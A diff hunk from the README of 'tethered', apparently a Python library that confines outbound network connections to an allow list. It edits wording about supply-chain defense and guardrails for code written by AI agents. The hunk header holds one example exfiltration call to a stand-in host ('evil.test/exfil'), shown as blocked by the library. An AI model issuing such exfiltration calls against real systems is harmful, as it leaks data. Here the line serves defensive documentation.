@@ -43,11 +43,11 @@ urllib.request.urlopen("https://evil.test/exfil")            # raises tethered.E
 
 ## Why
 
-Your code, your dependencies and AI-generated code share one Python process, and any of them can open a connection you never intended. Firewalls, network policies and proxies can stop that, but they take a platform team, a separate service or admin rights. tethered takes one line of Python. It complements those controls and does not replace them.
+Your code, your dependencies and AI-generated code share one Python process, and any of them can open an outbound connection you never intended. Firewalls, network policies and proxies can stop that, but they take a platform team, a separate service or admin rights. tethered takes one line of Python. It complements those controls and does not replace them.
 
 | Supply-chain defense | AI agent guardrails | Least privilege |
 |---|---|---|
-| A dependency that phones home through Python's networking is stopped: the process reaches the hosts you listed and nothing else. | Code an agent wrote runs under the same allow list as the rest of the process, in production and in your test suite. | `scope()` holds a request handler, a background job or a library call to the destinations it needs. |
+| A dependency that phones home or exfiltrates data through Python's networking is stopped: the process reaches the hosts you listed and nothing else. | Code an agent wrote runs under the same allow list as the rest of the process, in production and in your test suite. | `scope()` holds a request handler, a background job or a library call to the destinations it needs. |
 
 The check adds about 25 µs to a connection ([measurements](https://tethered.shcherbak.ai/ARCHITECTURE/#performance)).
 
